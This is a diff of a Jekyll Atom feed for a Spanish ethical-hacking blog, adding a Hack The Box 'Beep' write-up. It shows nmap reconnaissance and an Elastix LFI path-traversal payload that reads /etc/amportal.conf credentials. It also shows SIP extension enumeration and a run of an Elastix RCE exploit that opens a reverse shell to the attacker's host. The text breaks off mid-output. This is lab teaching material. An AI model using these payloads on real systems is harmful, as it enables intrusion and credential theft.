@@ -1,4 +1,396 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-06T20:43:00-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Función extractPorts</title><link href="http://localhost:4000/extractPorts/" rel="alternate" type="text/html" title="Función extractPorts" /><published>2021-09-06T00:00:00-05:00</published><updated>2021-09-06T00:00:00-05:00</updated><id>http://localhost:4000/extractPorts</id><content type="html" xml:base="http://localhost:4000/extractPorts/">&lt;p&gt;&lt;img src=&quot;/assets/images/extractPorts/banner-extractPorts.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-08T00:30:52-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Beep</title><link href="http://localhost:4000/htb-beep/" rel="alternate" type="text/html" title="Hack The Box Beep" /><published>2021-09-07T00:00:00-05:00</published><updated>2021-09-07T00:00:00-05:00</updated><id>http://localhost:4000/htb-beep</id><content type="html" xml:base="http://localhost:4000/htb-beep/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-beep/banner-beep.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;beep&quot;&gt;Beep&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.7.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.7
+PING 10.10.10.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.7: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;147 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.7 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 146.622/146.622/146.622/0.000 ms
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.7 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts                                                          
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.                                    
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-28 20:28 CDT                                                                    
+Initiating SYN Stealth Scan at 20:28                                                                                               
+Scanning 10.10.10.7 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]                                                                                                  
+Discovered open port 993/tcp on 10.10.10.7                                                                                         
+Discovered open port 110/tcp on 10.10.10.7
+Discovered open port 443/tcp on 10.10.10.7
+Discovered open port 995/tcp on 10.10.10.7
+Discovered open port 25/tcp on 10.10.10.7
+Discovered open port 143/tcp on 10.10.10.7
+Discovered open port 111/tcp on 10.10.10.7
+Discovered open port 22/tcp on 10.10.10.7
+Discovered open port 3306/tcp on 10.10.10.7
+Discovered open port 80/tcp on 10.10.10.7
+Discovered open port 10000/tcp on 10.10.10.7
+Discovered open port 4190/tcp on 10.10.10.7
+Discovered open port 5038/tcp on 10.10.10.7
+Discovered open port 4559/tcp on 10.10.10.7
+Discovered open port 4445/tcp on 10.10.10.7
+Discovered open port 878/tcp on 10.10.10.7
+Completed SYN Stealth Scan at 20:28, 13.93s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.7
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-08-28 20:28:06 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;14s
+Not shown: 65519 closed ports
+Reason: 65519 resets
+PORT      STATE SERVICE          REASON
+22/tcp    open  ssh              syn-ack ttl 63
+25/tcp    open  smtp             syn-ack ttl 63
+80/tcp    open  http             syn-ack ttl 63
+110/tcp   open  pop3             syn-ack ttl 63
+111/tcp   open  rpcbind          syn-ack ttl 63
+143/tcp   open  imap             syn-ack ttl 63
+443/tcp   open  https            syn-ack ttl 63
+878/tcp   open  unknown          syn-ack ttl 63
+993/tcp   open  imaps            syn-ack ttl 63
+995/tcp   open  pop3s            syn-ack ttl 63
+3306/tcp  open  mysql            syn-ack ttl 63
+4190/tcp  open  sieve            syn-ack ttl 63
+4445/tcp  open  upnotifyp        syn-ack ttl 63
+4559/tcp  open  hylafax          syn-ack ttl 63
+5038/tcp  open  unknown          syn-ack ttl 63
+10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.11 seconds
+           Raw packets sent: 68531 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.015MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68531 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.741MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.7
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted                       
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-29 18:55 CDT                                                                    
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.7                                                                                                    
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                        
+                                                                                                                                   
+PORT      STATE SERVICE    VERSION                                                                                                 
+22/tcp    open  ssh        OpenSSH 4.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                              
+| ssh-hostkey:                                                                                                                     
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                     
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                     
+25/tcp    open  smtp       Postfix smtpd                                                                                           
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN                       
+80/tcp    open  http       Apache httpd 2.2.3                                                                                      
+|_http-server-header: Apache/2.2.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
+|_http-title: Did not follow redirect to https://10.10.10.7/                                                                       
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4                                                            
+|_pop3-capabilities: PIPELINING UIDL IMPLEMENTATION&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Cyrus POP3 server v2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; USER EXPIRE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NEVER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; RESP-CODES AUTH-RESP-CODE APOP TOP LOGIN-DELAY&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; STLS
+111/tcp   open  rpcbind    2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            875/udp   status
+|_  100024  1            878/tcp   status
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_imap-capabilities: ACL CONDSTORE QUOTA OK URLAUTHA0001 IMAP4 LIST-SUBSCRIBED MAILBOX-REFERRALS &lt;span class=&quot;nv&quot;&gt;THREAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;REFERENCES X-NETSCAPE LISTEXT UIDPLUS Completed STARTTLS IMAP4rev1 RENAME BINARY ID &lt;span class=&quot;nv&quot;&gt;RIGHTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;kxte SORT LITERAL+ ANNOTATEMORE &lt;span class=&quot;nv&quot;&gt;THREAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ORDEREDSUBJECT &lt;span class=&quot;nv&quot;&gt;SORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MODSEQ NAMESPACE MULTIAPPEND CHILDREN IDLE CATENATE NO ATOMIC UNSELECT
+443/tcp   open  ssl/https?
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;localhost.localdomain/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeOrganization/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeState/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_ssl-date: 2021-08-30T00:03:16+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +4m41s from scanner time.
+878/tcp   open  status     1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
+993/tcp   open  ssl/imap   Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssl-date: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_tls-alpn: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_ssl-cert: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_tls-nextprotoneg: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_sslv2: ERROR: Script execution failed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; to debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;included w/cyrus imap&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+4445/tcp  open  upnotifyp?
+4559/tcp  open  hylafax    HylaFAX 4.3.10
+5038/tcp  open  asterisk   Asterisk Call Manager 1.1
+10000/tcp open  http       MiniServ 1.570 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Webmin httpd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; Charset=iso-8859-1).
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+
+Host script results:
+|_clock-skew: 4m40s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 394.30 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Obsevamos que se encuentra abierto el puerto 80 el cual redirige hacia el 443, así que tratamos de ver que contiene el servidor. Ingresando a la dirección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://10.10.10.7/&lt;/code&gt;, observamos el uso de la tecnología &lt;strong&gt;Elastix&lt;/strong&gt; e identificamos un exploit público:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/37637&quot;&gt;Exploit-db&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Identificamos un exploit asociado a LFI (Local File Inclusion), debido a que no conocemos la versión con la que está trabajando el sitio web, podriá probar agregando la línea que se indica &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;amp;module=Accounts&amp;amp;action&lt;/code&gt; y validar si tenemos la posibilidad de visualizar archivos del sistema; para este caso, el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/amportal.conf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-beep/beep_lfi.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En dicho documento podemos observar credenciales de acceso al portal de adminsitración de &lt;strong&gt;Elastix&lt;/strong&gt;; además de que es posible que se esté utilizando reutilización de credenciales.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# This file is part of FreePBX.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# FreePBX is free software: you can redistribute it and/or modify&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# it under the terms of the GNU General Public License as published by&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# the Free Software Foundation, either version 2 of the License, or&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# (at your option) any later version.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# FreePBX is distributed in the hope that it will be useful,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# but WITHOUT ANY WARRANTY; without even the implied warranty of&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# GNU General Public License for more details.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# You should have received a copy of the GNU General Public License&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# along with FreePBX. If not, see &amp;lt;http://www.gnu.org/licenses/&amp;gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# This file contains settings for components of the Asterisk Management Portal&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Spaces are not allowed!&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Run /usr/src/AMP/apply_conf.sh after making changes to this file&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# FreePBX Database configuration&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPDBHOST: Hostname where the FreePBX database resides&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPDBUSER: Username used to connect to the FreePBX database&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPDBPASS: Password for AMPDBUSER (above)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPENGINE: Telephony backend engine (e.g. asterisk)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPMGRUSER: Username to access the Asterisk Manager Interface&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# AMPMGRPASS: Password for AMPMGRUSER&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora debemos buscar una forma de poder ingresar a la máquina víctima. Existen tres formas de ingresar a la máquina. Para la primera forma, ingresamos al panel de administración en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.7/&lt;/code&gt; y observamos el uso de &lt;strong&gt;Elastix&lt;/strong&gt; y buscamos un exploit asociado a RCE:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit elastix
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                   |  Path
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Elastix - &lt;span class=&quot;s1&quot;&gt;'page'&lt;/span&gt; Cross-Site Scripting                                                            | php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                          | php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                    | php/webapps/34942.txt
+Elastix 2.2.0 - &lt;span class=&quot;s1&quot;&gt;'graph.php'&lt;/span&gt; Local File Inclusion                                                 | php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                | php/webapps/36305.txt
+Elastix &amp;lt; 2.5 - PHP Code Injection                                                               | php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                           | php/webapps/18650.py
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos el recurso &lt;em&gt;php/webapps/18650.py&lt;/em&gt;; sin embargo, para este caso, se utilizará el siguiente recurso &lt;a href=&quot;https://github.com/k4miyo/FreePBX-Elastix-RCE-exploit&quot;&gt;Elastix RCE&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/k4miyo/FreePBX-Elastix-RCE-exploit&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Para ejecutar el exploit, nos solicita información como: &lt;em&gt;rhost&lt;/em&gt;, &lt;em&gt;lhost&lt;/em&gt;, &lt;em&gt;lport&lt;/em&gt; y &lt;em&gt;extension&lt;/em&gt;. Para obtener la extensión, ejecutamos el siguiente comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ svwar &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; INVITE &lt;span class=&quot;nt&quot;&gt;-e100-500&lt;/span&gt; 10.10.10.7                                                                                             
+WARNING:TakeASip:using an INVITE scan on an endpoint &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;i.e. SIP phone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; may cause it to ring and wake up people &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the middle of the 
+night                                                                                                                              
+WARNING:TakeASip:extension &lt;span class=&quot;s1&quot;&gt;'100'&lt;/span&gt; probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension &lt;span class=&quot;s1&quot;&gt;'102'&lt;/span&gt; probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension &lt;span class=&quot;s1&quot;&gt;'113'&lt;/span&gt; probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension &lt;span class=&quot;s1&quot;&gt;'118'&lt;/span&gt; probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension &lt;span class=&quot;s1&quot;&gt;'122'&lt;/span&gt; probably exists but the response is unexpected
+...
++-----------+----------------+
+| Extension | Authentication |
++&lt;span class=&quot;o&quot;&gt;===========&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;+
+| 100       | weird          |
++-----------+----------------+
+| 102       | weird          |
++-----------+----------------+
+| 113       | weird          |
++-----------+----------------+
+| 118       | weird          |
++-----------+----------------+
++-----------+----------------+
+| 351       | weird          |
++-----------+----------------+
+| 233       | reqauth        |
++-----------+----------------+
+| 235       | weird          |
++-----------+----------------+
++-----------+----------------+
+| 493       | weird          |
++-----------+----------------+
+| 497       | weird          |
++-----------+----------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para este caso, el valor de &lt;em&gt;extension&lt;/em&gt; es 233. Una vez realizados los cambios y procedemos a ejecutar el exploit.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python elastix_rce.py &lt;span class=&quot;nt&quot;&gt;--lhost&lt;/span&gt; 10.10.14.6
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload: Payload generated
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Shell: Established connection!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;to :: on port 443: Done
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;connections on :::443: Got connection from ::ffff:10.10.10.7 on port 45927
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Request: Payload sent correctly
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Switching to interactive mode
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;asterisk
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:B2:53  
+          inet addr:10.10.10.7  Bcast:10.10.10.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:628 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:456 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
